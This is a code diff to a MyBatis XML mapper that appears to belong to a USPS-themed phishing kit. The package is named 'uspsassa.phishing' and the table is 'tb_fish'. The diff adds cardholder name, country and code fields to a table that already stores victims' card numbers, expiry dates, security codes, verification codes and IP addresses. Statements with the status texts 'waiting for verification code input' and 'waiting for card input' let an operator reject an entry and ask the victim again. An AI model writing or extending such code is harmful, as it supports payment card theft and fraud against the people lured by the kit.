@@ -21,6 +21,9 @@
         <result column="device_type" jdbcType="VARCHAR" property="deviceType"/>
         <result column="ip" jdbcType="VARCHAR" property="ip"/>
         <result column="create_time" jdbcType="BIGINT" property="createTime"/>
+        <result column="card_name" jdbcType="VARCHAR" property="cardName"/>
+        <result column="card_country" jdbcType="VARCHAR" property="cardCountry"/>
+        <result column="card_code" jdbcType="VARCHAR" property="cardCode"/>
     </resultMap>
     <sql id="Base_Column_List">
         <!--@mbg.generated-->
@@ -40,7 +43,10 @@
         `status`,
         device_type,
         ip,
-        create_time
+        create_time,
+        card_name,
+        card_country,
+        card_code
     </sql>
     <select id="selectByPrimaryKey" parameterType="java.lang.Integer" resultMap="BaseResultMap">
         <!--@mbg.generated-->
@@ -70,7 +76,8 @@
                 #{verificationCode,jdbcType=VARCHAR}, #{status,jdbcType=VARCHAR}, #{deviceType,jdbcType=VARCHAR},
                 #{ip,jdbcType=VARCHAR})
     </insert>
-    <insert id="insertSelective" parameterType="com.uspsassa.phishing.entity.Fish" keyProperty="id" useGeneratedKeys="true">
+    <insert id="insertSelective" parameterType="com.uspsassa.phishing.entity.Fish" keyProperty="id"
+            useGeneratedKeys="true">
         <!--@mbg.generated-->
         insert into phishing.tb_fish
         <trim prefix="(" suffix=")" suffixOverrides=",">
@@ -125,6 +132,15 @@
             <if test="createTime != null">
                 create_time,
             </if>
+            <if test="cardName != null and cardName != ''">
+                card_name,
+            </if>
+            <if test="cardCountry != null and cardCountry != ''">
+                card_country,
+            </if>
+            <if test="cardCode != null and cardCode != ''">
+                card_code,
+            </if>
         </trim>
         <trim prefix="values (" suffix=")" suffixOverrides=",">
             <if test="id != null">
@@ -178,6 +194,15 @@
             <if test="createTime != null">
                 #{createTime,jdbcType=TIMESTAMP},
             </if>
+            <if test="cardName != null and cardName != ''">
+                #{cardName,jdbcType=VARCHAR},
+            </if>
+            <if test="cardCountry != null and cardCountry != ''">
+                #{cardCountry,jdbcType=VARCHAR},
+            </if>
+            <if test="cardCode != null and cardCode != ''">
+                #{cardCode,jdbcType=VARCHAR},
+            </if>
         </trim>
     </insert>
     <update id="updateByPrimaryKeySelective" parameterType="com.uspsassa.phishing.entity.Fish">
@@ -229,6 +254,15 @@
             <if test="ip != null and ip != ''">
                 ip = #{ip,jdbcType=VARCHAR},
             </if>
+            <if test="createTime != null">
+                create_time = #{createTime,jdbcType=TIMESTAMP},
+            </if>
+            <if test="cardName != null and cardName != ''">
+                card_name = #{cardName,jdbcType=VARCHAR},
+            </if>
+            <if test="cardCountry != null and cardCountry != ''">
+                card_country = #{cardCountry,jdbcType=VARCHAR},
+            </if>
         </set>
         where id = #{id,jdbcType=INTEGER}
     </update>
@@ -250,7 +284,10 @@
             `status`          = #{status,jdbcType=VARCHAR},
             device_type       = #{deviceType,jdbcType=VARCHAR},
             ip                = #{ip,jdbcType=VARCHAR},
-            create_time       = #{createTime,jdbcType=BIGINT}
+            create_time       = #{createTime,jdbcType=BIGINT},
+            card_name         = #{cardName,jdbcType=VARCHAR},
+            card_country      = #{cardCountry,jdbcType=VARCHAR},
+            card_code         = #{cardCode,jdbcType=VARCHAR}
         where id = #{id,jdbcType=INTEGER}
     </update>
     <select id="findByAll" resultMap="BaseResultMap">
@@ -306,6 +343,15 @@
             </if>
             <if test="ip != null and ip != ''">
                 and ip = #{ip,jdbcType=VARCHAR}
+            </if>
+            <if test="createTime != null">
+                and create_time = #{createTime,jdbcType=TIMESTAMP}
+            </if>
+            <if test="cardName != null and cardName != ''">
+                and card_name = #{cardName,jdbcType=VARCHAR}
+            </if>
+            <if test="cardCountry != null and cardCountry != ''">
+                and card_country = #{cardCountry,jdbcType=VARCHAR}
             </if>
         </where>
     </select>
@@ -363,6 +409,15 @@
             <if test="ip != null and ip != ''">
                 and ip = #{ip,jdbcType=VARCHAR}
             </if>
+            <if test="createTime != null">
+                and create_time = #{createTime,jdbcType=TIMESTAMP}
+            </if>
+            <if test="cardName != null and cardName != ''">
+                and card_name = #{cardName,jdbcType=VARCHAR}
+            </if>
+            <if test="cardCountry != null and cardCountry != ''">
+                and card_country = #{cardCountry,jdbcType=VARCHAR}
+            </if>
         </where>
     </select>
 
@@ -374,17 +429,22 @@
 
     <update id="codeReject">
         update phishing.tb_fish
-        set status = '等待验证码输入',verification_code=''
+        set status           = '等待验证码输入',
+            verification_code=''
         where id = #{id,jdbcType=VARCHAR}
     </update>
 
     <update id="cardReject">
         update phishing.tb_fish
-        set status = '等待卡输入',card_number='',exp_date='',security_code=''
+        set status       = '等待卡输入',
+            card_number='',
+            exp_date='',
+            security_code=''
         where id = #{id,jdbcType=VARCHAR}
     </update>
 
     <delete id="removeFish">
-        delete from phishing.tb_fish
+        delete
+        from phishing.tb_fish
     </delete>
 </mapper>
